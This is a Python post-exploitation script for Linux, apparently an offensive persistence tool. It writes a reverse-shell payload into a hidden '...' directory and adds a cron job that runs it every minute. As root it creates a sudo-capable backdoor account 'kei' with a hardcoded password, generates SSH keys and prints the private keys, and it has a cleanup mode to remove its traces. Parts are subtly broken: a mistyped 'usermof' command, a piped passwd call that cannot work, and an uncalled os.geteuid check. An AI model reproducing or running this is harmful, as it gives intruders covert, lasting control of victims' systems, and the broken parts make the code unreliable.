import sys, os, subprocess, shutil

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class funcs:
    def __init__(self):
        pass

    def check_version(self):
        if sys.version_info[0] < 3:
            print("[!] Python 3.x is required to run this script.")
            sys.exit(1)

    def print_help(self):
        print("""Usage: python3 setup_persistence_local.py <ip> <port> <action>
        Example: python3 setup_persistence_local.py 127.0.0.1 4444
        Cleanup: python3 setup_persistence_local.py 127.0.0.1 4444 -c
        
        Note: This script will only work on Linux systems. 
        The ip and port must be valid and they are for the reverse shell in the crontab""")
    
    def find_crontab_file(self, search_str, rootdirs):

        for dirr in rootdirs:
            for folder, dirs, files in os.walk(dirr):
                for file in files:
                    try:
                        fullpath = os.path.join(folder, file)
                        with open(fullpath, 'r') as f:
                            for line in f:
                                if search_str in line:
                                    return fullpath
                    except:
                        pass

    def crontab(self, ip, port):
        output = subprocess.run(['which','crontab'], check=True, stdout=subprocess.PIPE).stdout
        crontab_path = output.decode('utf-8').strip()
        if not os.path.isfile(crontab_path):
            print("[!] Crontab not found.")
            return
        else:
            curr = subprocess.run([crontab_path, '-l'], check=True, stdout=subprocess.PIPE).stdout
            print(f"{bcolors.GREEN}[+] Current crontabs:{bcolors.ENDC}\n\n{curr.decode('utf-8')}" if curr else f"{bcolors.BLUE}[+] No crontabs found.{bcolors.ENDC}")
            if curr:
                filename = self.find_crontab_file(curr.decode('utf-8')[0:20], ["/var/", "/etc/", "/home/"])
                if not filename:
                    print(f"{bcolors.WARNING}[!] Crontab file not found.{bcolors.ENDC}")
                    return

                print(f"{bcolors.GREEN}[+] Crontab file found: {filename}{bcolors.ENDC}")
                print(f"{bcolors.GREEN}[+] Creating per.py file...{bcolors.ENDC}")

                subprocess.run(['mkdir', f'{os.environ["HOME"]}/...'], check=True, stdout=subprocess.DEVNULL)
                shutil.copy(filename, f'{os.environ["HOME"]}/.../{os.path.basename(filename)}.bak')

                with open(f'{os.environ["HOME"]}/.../per.py', 'w') as f:
                    f.write(f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""")

                print(f"{bcolors.GREEN}[+] Adding persistence to crontab file...{bcolors.ENDC}")
                with open(filename, 'w') as f:
                    f.write(curr.decode('utf-8') + f'\n* * * * * python3 {os.environ["HOME"]}/.../per.py\n')

                print(f"{bcolors.GREEN}[+] Done adding crontab.{bcolors.ENDC}")

    def create_local_account(self, username, password):
        print(f"{bcolors.GREEN}[+] Creating local account...{bcolors.ENDC}")
        subprocess.run(['useradd', '-m', '-s', '/bin/bash', username], check=True, stdout=subprocess.DEVNULL)
        subprocess.run(['usermof', '-aG', 'sudo', username], check=True, stdout=subprocess.DEVNULL)
        subprocess.run(['echo', f"'{password}'", '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
        print(f"{bcolors.GREEN}[+] Done creating local account {username}:{password}.{bcolors.ENDC}")

    def add_ssh_key(self, user, root):
        print(f"{bcolors.GREEN}[+] Adding ssh key...{bcolors.ENDC}")
        
        if root == False:
            user = os.environ["USER"]

        if root == True and user == "root":
            subprocess.run(['ssh-keygen', '-t', 'rsa',  '-C', '', '-f', '/root/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '700', '/root/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '600', '/root/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chown', '-R', 'root:root', '/root/.ssh'], check=True, stdout=subprocess.DEVNULL)
            with open(f'/root/.ssh/id_rsa', 'r') as f:
                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
        elif root == False and user != "root":
            subprocess.run(['ssh-keygen', '-t', 'rsa', '-C', '', '-f', f'/home/{os.environ["USER"]}/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '700', f'/home/{os.environ["USER"]}/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '600', f'/home/{os.environ["USER"]}/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
            with open(f'/home/{user}/.ssh/id_rsa', 'r') as f:
                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
        elif root == True and user != "root":
            subprocess.run(['ssh-keygen', '-t', 'rsa', '-C', '', '-f', f'/home/{user}/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chown', '-R', f'{user}:{user}', f'/home/{user}/.ssh'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '700', f'/home/{user}/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['chmod', '600', f'/home/{user}/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
            with open(f'/home/{user}/.ssh/id_rsa', 'r') as f:
                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")

    def rm_crontab(self):
        output = subprocess.run(['which','crontab'], check=True, stdout=subprocess.PIPE).stdout
        crontab_path = output.decode('utf-8').strip()

        if not os.path.isfile(crontab_path):
            print("[!] Crontab not found.")
            return
        else:
            curr = subprocess.run([crontab_path, '-l'], check=True, stdout=subprocess.PIPE).stdout
            filename = funcs().find_crontab_file(curr.decode('utf-8')[0:20], ["/var/", "/etc/"])
            if filename:
                with open(f'{os.environ["HOME"]}/.../{os.path.basename(filename)}.bak', 'r') as f:
                    curr = f.read()
                    with open(filename, 'w') as f:
                        f.write(curr)
                print(f"{bcolors.GREEN}[+] Done removing crontab file.{bcolors.ENDC}")

                subprocess.run(["rm", "-rf", f'{os.environ["HOME"]}/...'], check=True, stdout=subprocess.DEVNULL)

    def rm_local_account(self, user):
        subprocess.run(['userdel', user], check=True, stdout=subprocess.DEVNULL)
        print(f"{bcolors.GREEN}[+] Done removing local account {user}.{bcolors.ENDC}")

    def rm_ssh_key(self, user):

        if user == "root":
            subprocess.run(['rm', '/root/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['rm', '/root/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
            print(f"{bcolors.GREEN}[+] Done removing ssh key.{bcolors.ENDC}")
        else:
            subprocess.run(['rm', f'/home/{user}/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
            subprocess.run(['rm', f'/home/{user}/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
            print(f"{bcolors.GREEN}[+] Done removing ssh key.{bcolors.ENDC}") 

class user:
    def __init__(self, ip, port, user_name):
        self.ip = ip
        self.port = port
        self.username = user_name

        funcs().crontab(self.ip, self.port)
        funcs().add_ssh_key(self.username, False)

class root:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        funcs().crontab(self.ip, self.port)
        funcs().create_local_account('kei', 'B3-M1N3_1-L0v3-U-S0-MUCH-<3')
        funcs().add_ssh_key('kei', True)
        funcs().add_ssh_key('root', True)

class cleanup_root:
    def __init__(self):
        funcs().rm_crontab()
        funcs().rm_ssh_key('kei')
        funcs().rm_ssh_key('root')
        funcs().rm_local_account('kei')
        sys.exit(0)

class cleanup_user:
    def __init__(self, user):
        funcs().rm_crontab()
        funcs().rm_ssh_key(user)
        sys.exit(0)

if __name__ == '__main__':

    funcs().check_version()
    username = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE).stdout.decode('utf-8').strip()

    try:
        ip = sys.argv[1]
        port = sys.argv[2]

        if ip == '-h' or ip == '--help':
            funcs().print_help()
            sys.exit(0)
    except IndexError:
        funcs().print_help()
        sys.exit(1)

    try:
        if sys.argv[3] == '-c' and os.geteuid == 0: cleanup_root()
        elif sys.argv[3] == '-c' and os.geteuid != 0: cleanup_user(username)
        else: pass
    except IndexError:
        if os.geteuid() == 0:
            root(ip, port)
        else:
            user(ip, port, username)
